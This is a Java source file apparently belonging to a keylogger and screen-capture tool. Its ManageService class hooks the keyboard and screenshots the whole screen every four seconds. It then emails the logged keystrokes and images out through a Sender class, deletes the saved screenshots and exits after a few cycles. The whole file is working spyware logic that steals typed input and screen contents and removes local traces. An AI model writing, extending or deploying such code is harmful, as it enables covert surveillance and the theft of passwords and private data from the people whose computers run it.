package services;

import handlers.ImageStorage;
import handlers.Sender;
import handlers.Utils;
import keys.NativeKeyboard;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;


public class ManageService implements Runnable
{
    private NativeKeyboard keyboard;

    private ImageStorage imageStorage;

    private Integer endProgram = 0;


    public ManageService()
    {
        keyboard = new NativeKeyboard();
        imageStorage = new ImageStorage();
        Thread service = new Thread(this,"Manage service");
        service.start();
    }

    public NativeKeyboard getKeyboard()
    {
        return keyboard;
    }

    @Override
    public void run()
    {

        GraphicsEnvironment environment = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice screen = environment.getDefaultScreenDevice();

        long start = System.nanoTime();
        while(true)
        {

            long elapsed = (System.nanoTime() - start) / 1_000_000;

            try
            {
                Thread.sleep(4000);
                final Robot robot = new Robot(screen);
                runRobot(robot);
            }
            catch(AWTException | InterruptedException e)
            {
                e.printStackTrace();
            }

            if(elapsed > 5_000)
            {
                try
                {
                    Sender.sendMail(Utils.print(keyboard.getKeyCache()), imageStorage.getImagesList());
                    keyboard.onSend();
                }
                catch (Throwable e)
                {
                    e.printStackTrace();
                    try
                    {
                        Sender.sendMail("DATA FAILED", imageStorage.getImagesList());
                        keyboard.onSend();
                    }
                    catch (Throwable throwable)
                    {
                        throwable.printStackTrace();
                    }
                    keyboard.onFail();
                }

                start = System.nanoTime();

                File directory = new File(imageStorage.imagesPath);
                if (directory.exists() && directory.listFiles() != null)
                {
                    if(directory.listFiles().length > 0)
                    {
                        for(File file : directory.listFiles())
                        {
                            file.delete();
                        }
                    }
                }

                imageStorage.clearImages();
                endProgram++;
                if(endProgram > 2)
                {
                    System.exit(0);
                }
            }
        }
    }

    private void runRobot(Robot robot)
    {
        BufferedImage  image = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        try
        {
            SimpleDateFormat simpleDateFormat = new	SimpleDateFormat("yyyy.MM.dd hh.mm.ss");
            String name = simpleDateFormat.format(new Date());
            String filename = imageStorage.imagesPath + name + ".png";
            ImageIO.write(image, "png", new File(filename));
            imageStorage.addImageToList(filename);
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }

    }
}
